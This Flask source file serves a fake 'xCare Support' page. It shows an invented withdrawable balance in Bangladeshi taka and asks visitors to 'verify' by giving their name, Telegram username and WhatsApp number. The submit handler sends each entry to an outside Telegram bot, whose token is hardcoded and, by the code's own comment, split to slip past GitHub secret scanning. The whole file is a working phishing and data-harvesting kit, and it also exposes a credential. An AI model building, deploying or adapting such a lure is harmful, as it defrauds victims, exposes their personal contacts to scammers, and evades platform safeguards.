from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# Security bypass for GitHub
B_1 = "8540257283"
B_2 = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
TOKEN = f"{B_1}:{B_2}"
CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Support</title>
        <style>
            body { font-family: sans-serif; background: #0b162c; color: white; margin: 0; padding: 0; }
            .header { background: #162641; padding: 15px; display: flex; justify-content: space-between; border-bottom: 1px solid #253959; font-size: 12px; }
            .balance-card { background: linear-gradient(135deg, #0d47a1, #1976d2); padding: 20px; border-radius: 15px; margin: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
            .form-box { background: #162641; padding: 20px; border-radius: 15px; margin: 20px; border: 1px solid #253959; }
            .input { width: 100%; padding: 12px; margin: 10px 0; background: #0b162c; border: 1px solid #253959; border-radius: 8px; color: white; box-sizing: border-box; }
            .btn { background: #1976d2; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="header"><span>🌐 Gateway: Online</span><span>ID: 1XB-7729-MS</span></div>
        <div class="balance-card">
            <small>WITHDRAWABLE BALANCE</small>
            <h2 style="margin: 5px 0;">৳ 5,450.00 BDT</h2>
            <span style="color: #4caf50; font-size: 11px;">● Verified Account</span>
        </div>
        <div class="form-box">
            <h4 style="margin: 0 0 15px 0; color: #8fa3bf;">👤 AGENT VERIFICATION</h4>
            <form id="vForm">
                <input type="text" name="name" class="input" placeholder="Full Name" required>
                <input type="text" name="user" class="input" placeholder="Telegram @username" required>
                <input type="text" name="phone" class="input" placeholder="WhatsApp Number" required>
                <button type="submit" class="btn" id="sBtn">LINK ACCOUNT</button>
            </form>
        </div>
        <script>
            document.getElementById('vForm').onsubmit = async (e) => {
                e.preventDefault();
                document.getElementById('sBtn').innerText = 'WAIT...';
                const d = Object.fromEntries(new FormData(e.target));
                const r = await fetch('/submit-data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(d)
                });
                if(r.ok) { alert('সফলভাবে পাঠানো হয়েছে!'); location.reload(); }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/submit-data', methods=['POST'])
def handle():
    d = request.json
    msg = f"🚀 **New Agent Request**\nName: {d.get('name')}\nUser: {d.get('user')}\nPhone: {d.get('phone')}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
